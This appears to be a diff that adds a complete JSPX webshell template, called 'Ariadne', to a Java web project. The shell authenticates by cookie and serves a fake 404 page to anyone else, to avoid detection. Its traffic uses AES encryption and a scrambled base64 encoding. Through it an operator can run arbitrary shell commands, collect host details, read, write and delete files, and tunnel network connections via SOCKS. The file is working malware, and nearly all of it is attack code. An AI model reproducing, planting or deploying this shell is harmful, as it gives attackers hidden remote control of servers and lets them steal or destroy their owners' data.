@@ -1,0 +1,854 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+  <jsp:directive.page import="java.io.*" />
+  <jsp:directive.page import="java.net.*" />
+  <jsp:directive.page import="java.nio.file.*" />
+  <jsp:directive.page import="java.nio.file.attribute.*" />
+  <jsp:directive.page import="java.security.*" />
+  <jsp:directive.page import="java.text.SimpleDateFormat" />
+  <jsp:directive.page import="java.util.*" />
+  <jsp:directive.page import="javax.crypto.*" />
+  <jsp:directive.page import="javax.crypto.spec.*" />
+
+  <jsp:declaration>
+    // Ariadne JSPX webshell template
+    // Configuration tokens are replaced at build time by the Ariadne builder.
+
+    static final String ARIADNE_UUID = "a2ee1a49-bf6c-4d24-8da4-8e516c096115";
+    static final String ARIADNE_AUTH_METHOD = "cookie";
+    static final String ARIADNE_AUTH_NAME = "ARIADNE_SID";
+    static final String ARIADNE_AUTH_VALUE = "ariadne-jspx-final";
+    static final String ARIADNE_ENCODING = "deformed_base64";
+    static final String ARIADNE_DEFORMED_ALPHABET = "ZcDfAQroVuyINkPCY3isjht2egmwRXG50Ha7Kdz1/6U+JMlBOWpnFSEL49vx8qTb";
+    static final String ARIADNE_STANDARD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    static final String ARIADNE_ENCRYPTION = "aes256_cbc";
+    static final String ARIADNE_AES_KEY = "dAWSCAdx1lY9E+/MqvxOgU+UuIhyawBRIID2GjOaiNs=";
+    static final String ARIADNE_REQUEST_TEMPLATE = "form_post";
+    static final String ARIADNE_REQUEST_PARAM = "data";
+    static final String ARIADNE_CAMOUFLAGE_HTML = "&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 - File or directory not found.&lt;/title&gt;\n&lt;style&gt;body{font-family:\"Segoe UI\",Tahoma,Arial,sans-serif;margin:0;background:#eee}\n.container{max-width:800px;margin:50px auto;background:#fff;border:1px solid #ddd;padding:40px}\nh1{color:#c00;font-size:24px;border-bottom:1px solid #ccc;padding-bottom:10px}\nh2{color:#555;font-size:16px;font-weight:normal}\np{color:#777;font-size:13px;line-height:1.6}&lt;/style&gt;&lt;/head&gt;\n&lt;body&gt;&lt;div class=\"container\"&gt;\n&lt;h1&gt;Server Error&lt;/h1&gt;\n&lt;h2&gt;404 - File or directory not found.&lt;/h2&gt;\n&lt;p&gt;The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.&lt;/p&gt;\n&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n";
+    static final int ARIADNE_RESPONSE_STATUS = 200;
+    static final String ARIADNE_RESPONSE_CT = "text/html";
+    static final boolean ARIADNE_ENABLE_SOCKS = false;
+    static final boolean ARIADNE_ENABLE_P2P_HTTP = false;
+    static final boolean ARIADNE_ENABLE_P2P_TCP = false;
+    static final int ARIADNE_TCP_PORT = 7443;
+    static final boolean ARIADNE_DEBUG = true;
+
+    // --- SOCKS tunnel storage (keyed by session) ---
+    static final Map&lt;String, Map&lt;String, Socket&gt;&gt; tunnelSessions =
+        Collections.synchronizedMap(new HashMap&lt;String, Map&lt;String, Socket&gt;&gt;());
+
+    // --- P2P queue file path ---
+    static final String p2pQueueFile = System.getProperty("java.io.tmpdir")
+        + File.separator + ".ariadne_p2p_" + md5Hash(ARIADNE_UUID);
+
+    // =========================================================================
+    // UTILITY
+    // =========================================================================
+
+    private static String md5Hash(String input) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            byte[] digest = md.digest(input.getBytes("UTF-8"));
+            StringBuilder sb = new StringBuilder();
+            for (byte b : digest) {
+                sb.append(String.format("%02x", b &amp; 0xff));
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "0";
+        }
+    }
+
+    private static String bytesToHex(byte[] bytes) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) {
+            sb.append(String.format("%02x", b &amp; 0xff));
+        }
+        return sb.toString();
+    }
+
+    private static byte[] hexToBytes(String hex) {
+        int len = hex.length();
+        byte[] out = new byte[len / 2];
+        for (int i = 0; i &lt; len; i += 2) {
+            out[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) &lt;&lt; 4)
+                                  + Character.digit(hex.charAt(i + 1), 16));
+        }
+        return out;
+    }
+
+    // =========================================================================
+    // ENCODING
+    // =========================================================================
+
+    private static String ariadneEncode(byte[] data) {
+        if ("deformed_base64".equals(ARIADNE_ENCODING)) {
+            String standard = Base64.getEncoder().encodeToString(data);
+            return translateChars(standard, ARIADNE_STANDARD_ALPHABET, ARIADNE_DEFORMED_ALPHABET);
+        } else if ("standard_base64".equals(ARIADNE_ENCODING)) {
+            return Base64.getEncoder().encodeToString(data);
+        } else if ("hex".equals(ARIADNE_ENCODING)) {
+            return bytesToHex(data);
+        }
+        return Base64.getEncoder().encodeToString(data);
+    }
+
+    private static byte[] ariadneDecode(String encoded) {
+        if ("deformed_base64".equals(ARIADNE_ENCODING)) {
+            String standard = translateChars(encoded, ARIADNE_DEFORMED_ALPHABET, ARIADNE_STANDARD_ALPHABET);
+            return Base64.getDecoder().decode(standard);
+        } else if ("standard_base64".equals(ARIADNE_ENCODING)) {
+            return Base64.getDecoder().decode(encoded);
+        } else if ("hex".equals(ARIADNE_ENCODING)) {
+            return hexToBytes(encoded);
+        }
+        return Base64.getDecoder().decode(encoded);
+    }
+
+    private static String translateChars(String input, String from, String to) {
+        StringBuilder sb = new StringBuilder(input.length());
+        for (int i = 0; i &lt; input.length(); i++) {
+            char c = input.charAt(i);
+            int idx = from.indexOf(c);
+            if (idx &gt;= 0) {
+                sb.append(to.charAt(idx));
+            } else {
+                sb.append(c);
+            }
+        }
+        return sb.toString();
+    }
+
+    // =========================================================================
+    // ENCRYPTION
+    // =========================================================================
+
+    private static byte[] ariadneEncrypt(String plaintext) throws Exception {
+        if (!"aes256_cbc".equals(ARIADNE_ENCRYPTION) || ARIADNE_AES_KEY == null || ARIADNE_AES_KEY.isEmpty()) {
+            return plaintext.getBytes("UTF-8");
+        }
+
+        byte[] key = Base64.getDecoder().decode(ARIADNE_AES_KEY);
+        byte[] iv = new byte[16];
+        SecureRandom sr = new SecureRandom();
+        sr.nextBytes(iv);
+
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
+        IvParameterSpec ivSpec = new IvParameterSpec(iv);
+        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
+        byte[] ciphertext = cipher.doFinal(plaintext.getBytes("UTF-8"));
+
+        // blob = iv + ciphertext
+        byte[] blob = new byte[iv.length + ciphertext.length];
+        System.arraycopy(iv, 0, blob, 0, iv.length);
+        System.arraycopy(ciphertext, 0, blob, iv.length, ciphertext.length);
+
+        // HMAC-SHA256
+        Mac mac = Mac.getInstance("HmacSHA256");
+        mac.init(new SecretKeySpec(key, "HmacSHA256"));
+        byte[] hmac = mac.doFinal(blob);
+
+        // result = blob + hmac
+        byte[] result = new byte[blob.length + hmac.length];
+        System.arraycopy(blob, 0, result, 0, blob.length);
+        System.arraycopy(hmac, 0, result, blob.length, hmac.length);
+        return result;
+    }
+
+    private static String ariadneDecrypt(byte[] blob) throws Exception {
+        if (!"aes256_cbc".equals(ARIADNE_ENCRYPTION) || ARIADNE_AES_KEY == null || ARIADNE_AES_KEY.isEmpty()) {
+            return new String(blob, "UTF-8");
+        }
+
+        byte[] key = Base64.getDecoder().decode(ARIADNE_AES_KEY);
+
+        if (blob.length &lt; 48) { // 16 IV + min 16 ciphertext + 32 HMAC
+            return null;
+        }
+
+        // Split: iv_and_ct = blob[0..-32], hmac_received = blob[-32..]
+        byte[] hmacReceived = new byte[32];
+        byte[] ivAndCt = new byte[blob.length - 32];
+        System.arraycopy(blob, blob.length - 32, hmacReceived, 0, 32);
+        System.arraycopy(blob, 0, ivAndCt, 0, blob.length - 32);
+
+        // Verify HMAC
+        Mac mac = Mac.getInstance("HmacSHA256");
+        mac.init(new SecretKeySpec(key, "HmacSHA256"));
+        byte[] hmacComputed = mac.doFinal(ivAndCt);
+
+        if (!MessageDigest.isEqual(hmacComputed, hmacReceived)) {
+            return null;
+        }
+
+        // Decrypt
+        byte[] iv = new byte[16];
+        byte[] ciphertext = new byte[ivAndCt.length - 16];
+        System.arraycopy(ivAndCt, 0, iv, 0, 16);
+        System.arraycopy(ivAndCt, 16, ciphertext, 0, ciphertext.length);
+
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
+        IvParameterSpec ivSpec = new IvParameterSpec(iv);
+        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
+        byte[] decrypted = cipher.doFinal(ciphertext);
+        return new String(decrypted, "UTF-8");
+    }
+
+    // =========================================================================
+    // AUTHENTICATION
+    // =========================================================================
+
+    private static boolean ariadneAuthenticate(HttpServletRequest req) {
+        String value = "";
+
+        if ("cookie".equals(ARIADNE_AUTH_METHOD)) {
+            Cookie[] cookies = req.getCookies();
+            if (cookies != null) {
+                for (Cookie c : cookies) {
+                    if (ARIADNE_AUTH_NAME.equals(c.getName())) {
+                        value = c.getValue();
+                        break;
+                    }
+                }
+            }
+        } else if ("header".equals(ARIADNE_AUTH_METHOD)) {
+            String hdr = req.getHeader(ARIADNE_AUTH_NAME);
+            if (hdr != null) {
+                value = hdr;
+            }
+        } else if ("parameter".equals(ARIADNE_AUTH_METHOD)) {
+            String param = req.getParameter(ARIADNE_AUTH_NAME);
+            if (param != null) {
+                value = param;
+            }
+        }
+
+        return MessageDigest.isEqual(
+            ARIADNE_AUTH_VALUE.getBytes(),
+            value.getBytes()
+        );
+    }
+
+    // =========================================================================
+    // REQUEST BODY EXTRACTION
+    // =========================================================================
+
+    private static String readRequestBody(HttpServletRequest req) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        BufferedReader reader = req.getReader();
+        String line;
+        while ((line = reader.readLine()) != null) {
+            sb.append(line);
+        }
+        return sb.toString();
+    }
+
+    private static String ariadneExtractPayload(HttpServletRequest req) throws IOException {
+        if ("form_post".equals(ARIADNE_REQUEST_TEMPLATE)) {
+            String param = req.getParameter(ARIADNE_REQUEST_PARAM);
+            return param != null ? param : "";
+        } else if ("image_data".equals(ARIADNE_REQUEST_TEMPLATE)) {
+            String param = req.getParameter(ARIADNE_REQUEST_PARAM);
+            if (param == null) param = "";
+            String prefix = "data:image/png;base64,";
+            if (param.startsWith(prefix)) {
+                return param.substring(prefix.length());
+            }
+            return param;
+        }
+
+        String body = readRequestBody(req);
+
+        if ("json_api".equals(ARIADNE_REQUEST_TEMPLATE)) {
+            return jsonExtractValue(body, ARIADNE_REQUEST_PARAM);
+        } else if ("xml_soap".equals(ARIADNE_REQUEST_TEMPLATE)) {
+            return soapExtractValue(body, ARIADNE_REQUEST_PARAM);
+        }
+
+        return body;
+    }
+
+    private static String jsonExtractValue(String json, String key) {
+        // Extract value for a top-level key from JSON: {"key":"value",...}
+        String searchKey = "\"" + key + "\"";
+        int keyIdx = json.indexOf(searchKey);
+        if (keyIdx &lt; 0) return "";
+        int colonIdx = json.indexOf(':', keyIdx + searchKey.length());
+        if (colonIdx &lt; 0) return "";
+        int start = colonIdx + 1;
+        // Skip whitespace
+        while (start &lt; json.length() &amp;&amp; Character.isWhitespace(json.charAt(start))) start++;
+        if (start &gt;= json.length()) return "";
+
+        if (json.charAt(start) == '"') {
+            // String value
+            start++;
+            StringBuilder val = new StringBuilder();
+            for (int i = start; i &lt; json.length(); i++) {
+                char c = json.charAt(i);
+                if (c == '\\' &amp;&amp; i + 1 &lt; json.length()) {
+                    val.append(json.charAt(i + 1));
+                    i++;
+                } else if (c == '"') {
+                    break;
+                } else {
+                    val.append(c);
+                }
+            }
+            return val.toString();
+        } else {
+            // Non-string value (number, bool, null)
+            int end = start;
+            while (end &lt; json.length() &amp;&amp; json.charAt(end) != ',' &amp;&amp; json.charAt(end) != '}') end++;
+            return json.substring(start, end).trim();
+        }
+    }
+
+    private static String soapExtractValue(String xml, String paramName) {
+        // Simple XML extraction: find paramName element value inside Body
+        String bodyStart = "";
+        int bodyIdx = -1;
+
+        // Try soap:Body or Body
+        String[] bodyTags = {"soap:Body", "soapenv:Body", "Body", "SOAP-ENV:Body"};
+        for (String tag : bodyTags) {
+            String open = "&lt;" + tag;
+            bodyIdx = xml.indexOf(open);
+            if (bodyIdx &gt;= 0) {
+                int close = xml.indexOf('&gt;', bodyIdx);
+                if (close &gt;= 0) {
+                    bodyStart = xml.substring(close + 1);
+                    break;
+                }
+            }
+        }
+        if (bodyStart.isEmpty()) bodyStart = xml;
+
+        // Find paramName element with or without namespace prefix
+        // Try exact match first
+        String openTag = "&lt;" + paramName + "&gt;";
+        String closeTag = "&lt;/" + paramName + "&gt;";
+        int startIdx = bodyStart.indexOf(openTag);
+        if (startIdx &gt;= 0) {
+            int valStart = startIdx + openTag.length();
+            int valEnd = bodyStart.indexOf(closeTag, valStart);
+            if (valEnd &gt;= 0) {
+                return bodyStart.substring(valStart, valEnd);
+            }
+        }
+
+        // Try with namespace prefix pattern ns:paramName
+        for (int i = 0; i &lt; bodyStart.length(); i++) {
+            if (bodyStart.charAt(i) == '&lt;') {
+                int end = bodyStart.indexOf('&gt;', i);
+                if (end &lt; 0) break;
+                String tagContent = bodyStart.substring(i + 1, end);
+                // Strip namespace prefix
+                String localName = tagContent.contains(":") ? tagContent.substring(tagContent.indexOf(':') + 1) : tagContent;
+                if (localName.equals(paramName)) {
+                    int valStart = end + 1;
+                    // Find closing tag
+                    int closeIdx = bodyStart.indexOf("&lt;/", valStart);
+                    if (closeIdx &gt;= 0) {
+                        return bodyStart.substring(valStart, closeIdx);
+                    }
+                }
+            }
+        }
+
+        return "";
+    }
+
+    // =========================================================================
+    // COMMAND HANDLERS
+    // =========================================================================
+
+    private static String cmdCheckin(String taskId) {
+        String hostname = "";
+        try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception e) { hostname = "unknown"; }
+
+        String os = System.getProperty("os.name", "unknown");
+        String user = System.getProperty("user.name", "unknown");
+        String domain = "";
+        try {
+            InetAddress addr = InetAddress.getLocalHost();
+            String fqdn = addr.getCanonicalHostName();
+            if (fqdn != null &amp;&amp; fqdn.contains(".")) {
+                domain = fqdn.substring(fqdn.indexOf('.') + 1);
+            }
+        } catch (Exception e) { /* ignore */ }
+
+        long pid = -1;
+        try {
+            String procName = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
+            pid = Long.parseLong(procName.split("@")[0]);
+        } catch (Exception e) { /* ignore */ }
+
+        String arch = System.getProperty("os.arch", "unknown");
+        String cwd = System.getProperty("user.dir", ".");
+        String ips = "";
+        try {
+            Enumeration&lt;NetworkInterface&gt; nets = NetworkInterface.getNetworkInterfaces();
+            List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();
+            while (nets.hasMoreElements()) {
+                NetworkInterface ni = nets.nextElement();
+                if (ni.isLoopback() || !ni.isUp()) continue;
+                Enumeration&lt;InetAddress&gt; addrs = ni.getInetAddresses();
+                while (addrs.hasMoreElements()) {
+                    InetAddress a = addrs.nextElement();
+                    if (a instanceof java.net.Inet4Address) {
+                        ipList.add(a.getHostAddress());
+                    }
+                }
+            }
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i &lt; ipList.size(); i++) {
+                if (i &gt; 0) sb.append(",");
+                sb.append(ipList.get(i));
+            }
+            ips = sb.toString();
+        } catch (Exception e) { /* ignore */ }
+
+        return "0|" + taskId + "|" + hostname + "|" + os + "|" + user + "|"
+               + domain + "|" + pid + "|" + arch + "|" + cwd + "|" + ips;
+    }
+
+    private static String cmdShell(String taskId, String command) {
+        try {
+            ProcessBuilder pb;
+            String osName = System.getProperty("os.name", "").toLowerCase();
+            if (osName.contains("win")) {
+                pb = new ProcessBuilder("cmd.exe", "/c", command);
+            } else {
+                pb = new ProcessBuilder("/bin/sh", "-c", command);
+            }
+            pb.redirectErrorStream(true);
+            Process proc = pb.start();
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (output.length() &gt; 0) output.append("\n");
+                output.append(line);
+            }
+            proc.waitFor();
+            reader.close();
+            return "0|" + taskId + "|" + output.toString();
+        } catch (Exception e) {
+            return "1|" + taskId + "|Shell execution failed: " + e.getMessage();
+        }
+    }
+
+    private static String cmdLs(String taskId, String path) {
+        File dir = new File(path);
+        if (!dir.isDirectory()) {
+            return "1|" + taskId + "|Not a directory: " + path;
+        }
+
+        File[] entries = dir.listFiles();
+        if (entries == null) {
+            return "1|" + taskId + "|Cannot read directory: " + path;
+        }
+
+        StringBuilder filesJson = new StringBuilder("[");
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+        boolean first = true;
+        for (File entry : entries) {
+            if (!first) filesJson.append(",");
+            first = false;
+
+            boolean isFile = entry.isFile();
+            long size = isFile ? entry.length() : 0;
+            String perms = "";
+            try {
+                Path p = entry.toPath();
+                if (!System.getProperty("os.name", "").toLowerCase().contains("win")) {
+                    Set&lt;PosixFilePermission&gt; posixPerms = Files.getPosixFilePermissions(p);
+                    int mode = 0;
+                    if (posixPerms.contains(PosixFilePermission.OWNER_READ)) mode |= 0400;
+                    if (posixPerms.contains(PosixFilePermission.OWNER_WRITE)) mode |= 0200;
+                    if (posixPerms.contains(PosixFilePermission.OWNER_EXECUTE)) mode |= 0100;
+                    if (posixPerms.contains(PosixFilePermission.GROUP_READ)) mode |= 040;
+                    if (posixPerms.contains(PosixFilePermission.GROUP_WRITE)) mode |= 020;
+                    if (posixPerms.contains(PosixFilePermission.GROUP_EXECUTE)) mode |= 010;
+                    if (posixPerms.contains(PosixFilePermission.OTHERS_READ)) mode |= 04;
+                    if (posixPerms.contains(PosixFilePermission.OTHERS_WRITE)) mode |= 02;
+                    if (posixPerms.contains(PosixFilePermission.OTHERS_EXECUTE)) mode |= 01;
+                    perms = String.format("%04o", mode);
+                } else {
+                    perms = entry.canRead() ? "r" : "-";
+                    perms += entry.canWrite() ? "w" : "-";
+                    perms += entry.canExecute() ? "x" : "-";
+                }
+            } catch (Exception e) {
+                perms = "0000";
+            }
+
+            String mtime = sdf.format(new Date(entry.lastModified()));
+
+            filesJson.append("{\"name\":\"").append(jsonEscape(entry.getName())).append("\",");
+            filesJson.append("\"is_file\":").append(isFile).append(",");
+            filesJson.append("\"size\":").append(size).append(",");
+            filesJson.append("\"permissions\":\"").append(perms).append("\",");
+            filesJson.append("\"modify_time\":\"").append(mtime).append("\"}");
+        }
+        filesJson.append("]");
+
+        String parentPath = "";
+        try { parentPath = dir.getCanonicalPath(); } catch (Exception e) { parentPath = dir.getAbsolutePath(); }
+
+        String hostname = "";
+        try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception e) { hostname = "unknown"; }
+
+        String result = "{\"host\":\"" + jsonEscape(hostname) + "\","
+                      + "\"parent_path\":\"" + jsonEscape(parentPath) + "\","
+                      + "\"files\":" + filesJson.toString() + "}";
+
+        return "0|" + taskId + "|" + result;
+    }
+
+    private static String jsonEscape(String s) {
+        if (s == null) return "";
+        return s.replace("\\", "\\\\").replace("\"", "\\\"")
+                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
+    }
+
+    private static String cmdCd(String taskId, String path) {
+        File dir = new File(path);
+        if (dir.isDirectory()) {
+            try {
+                String canonical = dir.getCanonicalPath();
+                System.setProperty("user.dir", canonical);
+                return "0|" + taskId + "|" + canonical;
+            } catch (Exception e) {
+                return "1|" + taskId + "|Cannot change directory to: " + path;
+            }
+        }
+        return "1|" + taskId + "|Cannot change directory to: " + path;
+    }
+
+    private static String cmdPwd(String taskId) {
+        return "0|" + taskId + "|" + System.getProperty("user.dir", ".");
+    }
+
+    private static String cmdDownload(String taskId, String filepath) {
+        File file = new File(filepath);
+        if (!file.exists()) {
+            return "1|" + taskId + "|File not found: " + filepath;
+        }
+        if (!file.canRead()) {
+            return "1|" + taskId + "|File not readable: " + filepath;
+        }
+
+        try {
+            byte[] contents = Files.readAllBytes(file.toPath());
+            long size = contents.length;
+            String encoded = Base64.getEncoder().encodeToString(contents);
+            String filename = file.getName();
+            String realpath = file.getCanonicalPath();
+
+            String result = "{\"filename\":\"" + jsonEscape(filename) + "\","
+                          + "\"filepath\":\"" + jsonEscape(realpath) + "\","
+                          + "\"size\":" + size + ","
+                          + "\"data\":\"" + encoded + "\"}";
+
+            return "0|" + taskId + "|" + result;
+        } catch (Exception e) {
+            return "1|" + taskId + "|Failed to read file: " + filepath;
+        }
+    }
+
+    private static String cmdUpload(String taskId, String remotePath, String b64Content) {
+        try {
+            File file = new File(remotePath);
+            File parent = file.getParentFile();
+            if (parent != null &amp;&amp; !parent.exists()) {
+                parent.mkdirs();
+            }
+
+            byte[] content = Base64.getDecoder().decode(b64Content);
+            Files.write(file.toPath(), content);
+
+            return "0|" + taskId + "|Uploaded " + content.length + " bytes to " + remotePath;
+        } catch (Exception e) {
+            return "1|" + taskId + "|Failed to write file: " + remotePath;
+        }
+    }
+
+    private static String cmdRm(String taskId, String path) {
+        File file = new File(path);
+        if (!file.exists()) {
+            return "1|" + taskId + "|Path not found: " + path;
+        }
+
+        boolean success;
+        if (file.isDirectory()) {
+            success = deleteRecursive(file);
+        } else {
+            success = file.delete();
+        }
+
+        if (success) {
+            return "0|" + taskId + "|Removed: " + path;
+        }
+        return "1|" + taskId + "|Failed to remove: " + path;
+    }
+
+    private static boolean deleteRecursive(File dir) {
+        File[] entries = dir.listFiles();
+        if (entries != null) {
+            for (File entry : entries) {
+                if (entry.isDirectory()) {
+                    deleteRecursive(entry);
+                } else {
+                    entry.delete();
+                }
+            }
+        }
+        return dir.delete();
+    }
+
+    // =========================================================================
+    // SOCKS TUNNEL HANDLERS
+    // =========================================================================
+
+    private static String tunnelConnect(String sessionId, String mark, String data) {
+        try {
+            String target = new String(Base64.getDecoder().decode(data), "UTF-8");
+            String[] parts = target.split(":", 2);
+            if (parts.length != 2) {
+                return "1|Connection target invalid";
+            }
+
+            String ip = parts[0];
+            int port = Integer.parseInt(parts[1]);
+
+            Socket socket = new Socket();
+            socket.connect(new InetSocketAddress(ip, port), 10000);
+            socket.setSoTimeout(100);
+
+            Map&lt;String, Socket&gt; tunnels = tunnelSessions.get(sessionId);
+            if (tunnels == null) {
+                tunnels = Collections.synchronizedMap(new HashMap&lt;String, Socket&gt;());
+                tunnelSessions.put(sessionId, tunnels);
+            }
+            tunnels.put(mark, socket);
+
+            return "0|Connected";
+        } catch (Exception e) {
+            return "1|Connection failed: " + e.getMessage();
+        }
+    }
+
+    private static String tunnelForward(String sessionId, String mark, String data) {
+        Map&lt;String, Socket&gt; tunnels = tunnelSessions.get(sessionId);
+        if (tunnels == null || !tunnels.containsKey(mark)) {
+            return "1|No tunnel session: " + mark;
+        }
+
+        Socket socket = tunnels.get(mark);
+        if (socket.isClosed()) {
+            tunnels.remove(mark);
+            return "1|Tunnel closed";
+        }
+
+        try {
+            byte[] raw = Base64.getDecoder().decode(data);
+            OutputStream os = socket.getOutputStream();
+            os.write(raw);
+            os.flush();
+            return "0|" + raw.length;
+        } catch (Exception e) {
+            try { socket.close(); } catch (Exception ex) { /* ignore */ }
+            tunnels.remove(mark);
+            return "1|Write failed";
+        }
+    }
+
+    private static String tunnelRead(String sessionId, String mark) {
+        Map&lt;String, Socket&gt; tunnels = tunnelSessions.get(sessionId);
+        if (tunnels == null || !tunnels.containsKey(mark)) {
+            return "1|No tunnel session: " + mark;
+        }
+
+        Socket socket = tunnels.get(mark);
+        if (socket.isClosed()) {
+            tunnels.remove(mark);
+            return "1|Tunnel closed";
+        }
+
+        try {
+            InputStream is = socket.getInputStream();
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buf = new byte[8192];
+            int totalRead = 0;
+
+            try {
+                int n;
+                while ((n = is.read(buf)) &gt; 0) {
+                    baos.write(buf, 0, n);
+                    totalRead += n;
+                    if (totalRead &gt;= 524288) break;
+                    if (is.available() &lt;= 0) break;
+                }
+            } catch (java.net.SocketTimeoutException e) {
+                // expected: non-blocking read timeout
+            }
+
+            String encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
+            return "0|" + encoded;
+        } catch (Exception e) {
+            try { socket.close(); } catch (Exception ex) { /* ignore */ }
+            tunnels.remove(mark);
+            return "1|Read failed";
+        }
+    }
+
+    private static String tunnelDisconnect(String sessionId, String mark) {
+        Map&lt;String, Socket&gt; tunnels = tunnelSessions.get(sessionId);
+        if (tunnels != null &amp;&amp; tunnels.containsKey(mark)) {
+            Socket socket = tunnels.get(mark);
+            try { socket.close(); } catch (Exception e) { /* ignore */ }
+            tunnels.remove(mark);
+        }
+        return "0|Disconnected";
+    }
+
+    // =========================================================================
+    // P2P MESSAGE QUEUE
+    // =========================================================================
+
+    private static synchronized void p2pQueuePush(String message) {
+        try {
+            FileWriter fw = new FileWriter(p2pQueueFile, true);
+            fw.write(message + "\n");
+            fw.close();
+        } catch (Exception e) { /* ignore */ }
+    }
+
+    private static synchronized String p2pQueueDrain() {
+        File f = new File(p2pQueueFile);
+        if (!f.exists()) return "";
+        try {
+            byte[] bytes = Files.readAllBytes(f.toPath());
+            // Clear the file
+            new FileWriter(p2pQueueFile, false).close();
+            return new String(bytes, "UTF-8").trim();
+        } catch (Exception e) {
+            return "";
+        }
+    }
+  </jsp:declaration>
+
+  <jsp:scriptlet>
+    // =========================================================================
+    // MAIN DISPATCH
+    // =========================================================================
+
+    // Authentication check
+    if (!ariadneAuthenticate(request)) {
+        response.setStatus(ARIADNE_RESPONSE_STATUS == 200 ? 404 : ARIADNE_RESPONSE_STATUS);
+        out.print(ARIADNE_CAMOUFLAGE_HTML);
+        return;
+    }
+
+    // Extract payload
+    String encodedPayload = ariadneExtractPayload(request);
+    if (encodedPayload == null || encodedPayload.isEmpty()) {
+        response.setStatus(ARIADNE_RESPONSE_STATUS);
+        response.setContentType(ARIADNE_RESPONSE_CT);
+        out.print(ARIADNE_CAMOUFLAGE_HTML);
+        return;
+    }
+
+    // Decode and decrypt
+    byte[] rawBytes = ariadneDecode(encodedPayload);
+    String plaintext = ariadneDecrypt(rawBytes);
+
+    if (plaintext == null) {
+        response.setStatus(500);
+        return;
+    }
+
+    // Parse command
+    String[] parts = plaintext.split("\\|", -1);
+    String action = parts.length &gt; 0 ? parts[0] : "";
+    String taskId = parts.length &gt; 1 ? parts[1] : "";
+
+    String cmdResponse = "";
+
+    if ("checkin".equals(action)) {
+        cmdResponse = cmdCheckin(taskId);
+    } else if ("shell".equals(action)) {
+        String command = "";
+        if (parts.length &gt; 2) {
+            StringBuilder sb = new StringBuilder();
+            for (int i = 2; i &lt; parts.length; i++) {
+                if (i &gt; 2) sb.append("|");
+                sb.append(parts[i]);
+            }
+            command = sb.toString();
+        }
+        cmdResponse = cmdShell(taskId, command);
+    } else if ("ls".equals(action)) {
+        String lsPath = parts.length &gt; 2 ? parts[2] : ".";
+        cmdResponse = cmdLs(taskId, lsPath);
+    } else if ("cd".equals(action)) {
+        String cdPath = parts.length &gt; 2 ? parts[2] : ".";
+        cmdResponse = cmdCd(taskId, cdPath);
+    } else if ("pwd".equals(action)) {
+        cmdResponse = cmdPwd(taskId);
+    } else if ("download".equals(action)) {
+        String dlPath = parts.length &gt; 2 ? parts[2] : "";
+        cmdResponse = cmdDownload(taskId, dlPath);
+    } else if ("upload".equals(action)) {
+        String upPath = parts.length &gt; 2 ? parts[2] : "";
+        String upData = parts.length &gt; 3 ? parts[3] : "";
+        cmdResponse = cmdUpload(taskId, upPath, upData);
+    } else if ("rm".equals(action)) {
+        String rmPath = parts.length &gt; 2 ? parts[2] : "";
+        cmdResponse = cmdRm(taskId, rmPath);
+    } else if ("tunnel".equals(action)) {
+        if (ARIADNE_ENABLE_SOCKS) {
+            String tunnelMark = parts.length &gt; 1 ? parts[1] : "";
+            String tunnelCmd = parts.length &gt; 2 ? parts[2] : "";
+            String tunnelData = parts.length &gt; 3 ? parts[3] : "";
+            String sessionId = request.getSession(true).getId();
+
+            if ("CONNECT".equals(tunnelCmd)) {
+                cmdResponse = tunnelConnect(sessionId, tunnelMark, tunnelData);
+            } else if ("FORWARD".equals(tunnelCmd)) {
+                cmdResponse = tunnelForward(sessionId, tunnelMark, tunnelData);
+            } else if ("READ".equals(tunnelCmd)) {
+                cmdResponse = tunnelRead(sessionId, tunnelMark);
+            } else if ("DISCONNECT".equals(tunnelCmd)) {
+                cmdResponse = tunnelDisconnect(sessionId, tunnelMark);
+            } else {
+                cmdResponse = "1|Unknown tunnel command: " + tunnelCmd;
+            }
+        } else {
+            cmdResponse = "1|SOCKS tunneling not enabled";
+        }
+    } else if ("poll".equals(action) || "poll_p2p".equals(action)) {
+        String p2pData = "";
+        if (ARIADNE_ENABLE_P2P_HTTP &amp;&amp; "poll_p2p".equals(action)) {
+            p2pData = p2pQueueDrain();
+        }
+        cmdResponse = "0|poll|" + p2pData;
+    } else {
+        cmdResponse = "1|" + taskId + "|Unknown action: " + action;
+    }
+
+    // Encrypt and encode response
+    byte[] encryptedResponse = ariadneEncrypt(cmdResponse);
+    String encodedResponse = ariadneEncode(encryptedResponse);
+
+    // Send response
+    response.setStatus(ARIADNE_RESPONSE_STATUS);
+    response.setContentType(ARIADNE_RESPONSE_CT);
+    out.print("&lt;span id=\"r\"&gt;" + encodedResponse + "&lt;/span&gt;");
+  </jsp:scriptlet>
+</jsp:root>
